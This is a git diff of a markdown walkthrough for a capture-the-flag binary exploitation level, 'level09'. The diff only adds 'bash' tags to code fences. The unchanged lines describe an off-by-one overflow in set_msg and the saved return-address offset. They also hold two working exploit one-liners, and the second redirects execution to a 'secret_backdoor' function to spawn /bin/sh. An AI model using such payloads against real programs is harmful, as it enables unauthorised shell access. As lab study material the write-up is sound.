@@ -21,7 +21,7 @@ set_msg reads a large fgets of 1024 and then copies with strncpy up to p + 180 b
 
 We can then override the value stored at p + 180 with the 41st byte of our username.
 
-```
+```bash
 (python -c 'print "X" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9" + "\n"' ; cat) | ./level09
 ```
 
@@ -41,7 +41,7 @@ saved rip offset is 200
 
 lets redirect to => 0x55555555488c (secret_backdoor) and then pass it the parameter we want : "/bin/sh" (through its fgets)
 
-```
+```bash
 (python -c 'print "X" * 40 + "\xff" + "\n" + "X" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' ; cat) | ./level09
 ```
 
